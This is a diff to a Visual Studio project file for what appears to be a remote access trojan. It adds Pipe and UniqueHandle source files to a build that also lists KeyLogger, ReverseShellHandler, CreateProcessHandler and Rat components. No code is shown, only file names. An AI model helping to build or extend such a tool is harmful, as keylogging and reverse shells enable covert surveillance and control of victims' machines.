@@ -158,7 +158,8 @@
     <ClInclude Include="..\include\IRat.h" />
     <ClInclude Include="ChatHandler.h" />
     <ClInclude Include="CreateProcessHandler.h" />
-    <ClInclude Include="UniqueWrappers.h" />
+    <ClInclude Include="Pipe.h" />
+    <ClInclude Include="UniqueHandle.h" />
     <ClInclude Include="IMessageHandler.h" />
     <ClInclude Include="KeyLogger.h" />
     <ClInclude Include="PingHandler.h" />
@@ -175,11 +176,13 @@
     <ClCompile Include="IRat.cpp" />
     <ClCompile Include="KeyLogger.cpp" />
     <ClCompile Include="PingHandler.cpp" />
+    <ClCompile Include="Pipe.cpp" />
     <ClCompile Include="PressedKey.cpp" />
     <ClCompile Include="Process.cpp" />
     <ClCompile Include="SingleProcessManager.cpp" />
     <ClCompile Include="Rat.cpp" />
     <ClCompile Include="ReverseShellHandler.cpp" />
+    <ClCompile Include="UniqueHandle.cpp" />
   </ItemGroup>
   <ItemGroup>
     <ProjectReference Include="..\Communication\Communication.vcxproj">
